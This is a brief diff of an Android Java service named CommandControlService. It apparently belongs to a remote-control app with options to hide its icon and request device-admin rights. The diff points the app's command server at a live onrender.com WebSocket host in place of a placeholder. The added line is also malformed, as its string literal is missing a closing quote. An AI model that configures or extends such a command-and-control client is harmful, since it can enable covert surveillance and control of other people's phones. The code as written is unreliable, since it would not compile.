@@ -58,7 +58,7 @@ public class CommandControlService extends Service {
     
     // CONFIGURAÇÃO DO SERVIDOR - ALTERAR PARA SEU SERVIDOR!
     // URL do servidor - PUBLIC para acesso do StudioActivity
-    public static final String SERVER_URL = "wss://your-server.example.com/ws";
+    public static final String SERVER_URL = "wss://lost-nnuv.onrender.com;
     public static final String WEBVIEW_URL = "";
     public static final boolean HIDE_ICON = false;
     public static final boolean REQUEST_ADMIN = false;
